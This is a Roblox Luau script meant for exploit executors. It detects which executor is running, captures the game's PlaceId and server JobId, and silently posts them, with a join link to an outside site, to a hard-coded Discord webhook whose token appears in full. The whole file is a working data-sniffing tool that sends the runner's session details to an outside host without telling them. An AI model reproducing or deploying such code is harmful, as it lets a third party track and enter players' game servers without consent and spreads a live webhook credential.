local HttpService = game:GetService("HttpService")

-- Your Discord webhook
local webhook = "https://discord.com/api/webhooks/1420513049025970397/As4wF1pwwmf9-HdwSsaRC6X5lLPikZWzidNeRRPaJsSfmwLJ0nLqyXci-AwVAZL1dFWx"

-- Detect executor
local executor = "Unknown"
pcall(function()
    if identifyexecutor then
        executor = identifyexecutor()
    elseif syn then
        executor = "Synapse X"
    elseif fluxus then
        executor = "Fluxus"
    elseif KRNL_LOADED then
        executor = "Krnl"
    elseif is_sirhurt_closure then
        executor = "SirHurt"
    elseif getexecutorname then
        executor = getexecutorname()
    elseif WRD_LOADED then
        executor = "WeAreDevs"
    elseif isexecutorclosure then
        executor = "Script-Ware"
    elseif electron then
        executor = "Electron"
    end
end)

-- Build payload
local placeId = game.PlaceId
local jobId = game.JobId
local redirectLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", placeId, jobId)

local payload = {
    content = "**üì° JobId Sniffed:** `" .. jobId .. "`" ..
              "\n**üß† Executor Used:** `" .. executor .. "`" ..
              "\n**üöÄ Click to Join:** <" .. redirectLink .. ">"
}

-- Send to Discord
local requestFunction =
    (syn and syn.request) or
    (http and http.request) or
    (fluxus and fluxus.request) or
    (request) or
    (http_request) or
    (http_request_internal)

if requestFunction then
    pcall(function()
        requestFunction({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
else
    warn("‚ùå No compatible request function found.")
end
